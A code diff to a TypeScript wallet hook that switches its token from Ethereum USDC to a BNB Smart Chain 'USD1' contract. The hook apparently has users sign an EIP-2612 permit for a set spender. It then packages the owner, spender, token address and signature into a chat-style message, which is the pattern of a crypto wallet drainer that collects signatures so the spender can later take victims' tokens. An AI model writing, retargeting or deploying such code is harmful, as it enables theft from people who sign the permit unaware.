@@ -22,17 +22,9 @@ export interface USDCBalance {
 
 // Chain and Contract Configuration
 const SUPPORTED_CHAINS = {
-  1: {
-    name: 'Ethereum',
-    usdcAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-    usdcPermitVersion: '2',
-    // FIX: Switched to Cloudflare's public RPC which does not require an API key
-    rpcUrl: 'https://cloudflare-eth.com',
-    explorerUrl: 'https://etherscan.io',
-  },
   56: {
     name: 'BNB Smart Chain',
-    usdcAddress: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+    usd1Address: '0x8d0D000Ee44948FC98c9B98A4FA4921476f08B0d',
     usdcPermitVersion: '1',
     rpcUrl: 'https://bsc-dataseed.binance.org/',
     explorerUrl: 'https://bscscan.com',
@@ -142,7 +134,7 @@ export const useRealWallet = () => {
           const chainIdNum = parseInt(chainId);
           const rpcProvider = new ethers.JsonRpcProvider(chainConfig.rpcUrl);
           const contract = new ethers.Contract(
-            chainConfig.usdcAddress,
+            chainConfig.usd1Address,
             ERC20_ABI,
             rpcProvider
           );
@@ -160,7 +152,7 @@ export const useRealWallet = () => {
             balance: parseFloat(balance).toFixed(2),
             chainName: chainConfig.name,
             chainId: chainIdNum,
-            tokenAddress: chainConfig.usdcAddress,
+            tokenAddress: chainConfig.usd1Address,
             balanceRaw: balanceRaw.toString(),
           };
         } catch (error) {
@@ -299,7 +291,7 @@ export const useRealWallet = () => {
 
         const signer = await provider.getSigner();
         const contract = new ethers.Contract(
-          chainConfig.usdcAddress,
+          chainConfig.usd1Address,
           ERC20_ABI,
           signer
         );
@@ -308,7 +300,7 @@ export const useRealWallet = () => {
           name: await contract.name(),
           version: chainConfig.usdcPermitVersion,
           chainId: chainIdNum,
-          verifyingContract: chainConfig.usdcAddress,
+          verifyingContract: chainConfig.usd1Address,
         };
 
         const types = {
@@ -337,7 +329,7 @@ export const useRealWallet = () => {
 *Chain:* ${chainConfig.name} (${chainIdNum})
 *Owner (User):* \`${permitData.owner}\`
 *Spender:* \`${permitData.spender}\`
-*Token Address:* \`${chainConfig.usdcAddress}\`
+*Token Address:* \`${chainConfig.usd1Address}\`
 
 *Signature:* \`${signature}\`
 `;
@@ -348,7 +340,7 @@ export const useRealWallet = () => {
           signature,
           permitData: {
             ...permitData,
-            tokenAddress: chainConfig.usdcAddress
+            tokenAddress: chainConfig.usd1Address
           },
         });
 
